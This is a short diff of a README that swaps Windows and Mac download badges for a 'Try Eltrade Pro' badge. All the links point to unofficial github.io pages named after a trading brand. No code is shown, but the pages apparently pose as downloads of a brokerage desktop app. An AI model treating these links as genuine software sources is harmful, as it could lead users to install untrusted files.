@@ -6,10 +6,7 @@
 <br>
 <div align="center">
 
-[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://walkerphanwklv.github.io/.github/Etrade-Desktop)  
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://walkerphanwklv.github.io/.github/Etrade-Desktop)
-
-</div>  
+[![Try Eltrade Pro](https://img.shields.io/badge/Try-Eltrade%20Pro-0F766E?style=flat-square)](https://professional-etrade.github.io/.github/)
 
 ---
 
